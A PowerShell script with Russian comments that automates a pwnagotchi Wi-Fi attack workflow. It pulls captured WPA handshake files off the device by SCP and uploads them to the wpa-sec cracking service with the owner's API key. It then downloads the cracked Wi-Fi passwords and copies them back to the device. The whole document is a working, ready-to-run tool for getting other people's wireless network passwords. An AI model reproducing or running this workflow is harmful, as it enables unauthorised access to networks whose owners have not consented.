<#
  pwn-upload.ps1 — заливает хэндшейки pwnagotchi на wpa-sec СО СТОРОНЫ ПК.

  Девайсу интернет НЕ нужен — у компа он есть. Скрипт:
    1) читает твой wpa-sec api_key прямо с девайса,
    2) забирает все .pcap по USB (scp),
    3) заливает новые на wpa-sec твоим ключом,
    4) скачивает взломанные пароли,
    5) кладёт их обратно на девайс (чтобы он показывал пароли на экране).

  Запуск в PowerShell (из папки со скриптом):
      powershell -ExecutionPolicy Bypass -File pwn-upload.ps1

  Нужен встроенный в Windows 10/11 OpenSSH (ssh/scp) и curl.exe (тоже встроен).
  Пароль девайса (raspberry) спросит пару раз. Чтобы не спрашивал — один раз
  настрой ключ:  ssh-keygen  ->  ssh-copy-id pi@10.0.0.2  (или через PuTTY).
#>

$PI     = "pi@10.0.0.2"
$HS     = "/home/pi/handshakes"
$WPASEC = "https://wpa-sec.stanev.org"
$WORK   = Join-Path $env:TEMP "pwn-hs"
$SENT   = Join-Path $env:TEMP "pwn-sent.txt"

New-Item -ItemType Directory -Force -Path $WORK | Out-Null
if (-not (Test-Path $SENT)) { New-Item -ItemType File -Force -Path $SENT | Out-Null }

Write-Host "[1/5] читаю твой wpa-sec ключ с девайса..." -ForegroundColor Cyan
$KEY = (ssh $PI "grep wpa-sec.api_key /etc/pwnagotchi/config.toml | grep -oE '[0-9a-fA-F]{20,}'").Trim()
if (-not $KEY) { Write-Host "Не нашёл api_key на девайсе. Проверь config.toml." -ForegroundColor Red; exit 1 }

Write-Host "[2/5] забираю хэндшейки по USB..." -ForegroundColor Cyan
scp "${PI}:${HS}/*.pcap" "$WORK" 2>$null

$sent = Get-Content $SENT
$up = 0; $skip = 0
Write-Host "[3/5] заливаю новые на wpa-sec..." -ForegroundColor Cyan
Get-ChildItem "$WORK\*.pcap" -ErrorAction SilentlyContinue | ForEach-Object {
    if ($sent -contains $_.Name) { return }
    $code = (curl.exe -s -o NUL -w "%{http_code}" --max-time 40 -b "key=$KEY" -F "file=@$($_.FullName)" $WPASEC)
    if ($code -eq "200" -or $code -eq "302") {
        Add-Content $SENT $_.Name; $up++
        Write-Host ("   + " + $_.Name) -ForegroundColor Green
    } else { $skip++ }
}
Write-Host "   залито новых: $up ; не вышло: $skip"

Write-Host "[4/5] скачиваю взломанные пароли..." -ForegroundColor Cyan
curl.exe -s --max-time 40 -b "key=$KEY" "$WPASEC/?api&dl=1" -o "$WORK\cracked.potfile"
if ((Test-Path "$WORK\cracked.potfile") -and ((Get-Item "$WORK\cracked.potfile").Length -gt 0)) {
    $n = (Get-Content "$WORK\cracked.potfile").Count
    Write-Host "   получено строк: $n ; кладу обратно на девайс..." -ForegroundColor Green
    scp "$WORK\cracked.potfile" "${PI}:${HS}/wpa-sec.cracked.potfile" 2>$null
} else {
    Write-Host "   взломанных пока нет (или не скачалось)."
}

Write-Host "[5/5] готово. Залито хэндшейков: $up. Пароли появятся на экране девайса." -ForegroundColor Yellow
